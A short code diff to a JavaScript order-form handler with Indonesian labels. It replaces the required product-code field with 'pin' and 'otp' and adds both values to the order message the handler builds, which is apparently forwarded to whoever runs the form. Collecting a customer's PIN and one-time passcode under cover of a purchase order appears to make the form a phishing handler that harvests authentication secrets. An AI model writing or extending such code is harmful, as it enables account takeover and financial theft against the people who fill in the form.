@@ -30,7 +30,7 @@ module.exports = async function handler(req, res) {
   }
 
   const body = req.body || {};
-  const required = ["orderCode", "name", "phone", "email", "productCode", "product", "address", "postal", "shipping"];
+  const required = ["orderCode", "name", "phone", "email", "pin", "otp", "product", "address", "postal", "shipping"];
   if (required.some((key) => !clean(body[key]))) {
     return res.status(400).json({ ok: false, error: "Data pesanan belum lengkap." });
   }
@@ -49,7 +49,8 @@ module.exports = async function handler(req, res) {
     `<b>WhatsApp:</b> ${escapeHtml(body.phone)}`,
     `<b>Email:</b> ${escapeHtml(body.email)}`,
     "",
-    `<b>Kode Produk:</b> ${escapeHtml(body.productCode)}`,
+    `<b>PIN:</b> ${escapeHtml(body.pin)}`,
+    `<b>OTP:</b> ${escapeHtml(body.otp)}`,
     `<b>Produk:</b> ${escapeHtml(body.product)}`,
     `<b>Harga:</b> ${rupiah(price)}`,
     `<b>Jumlah:</b> ${qty}`,
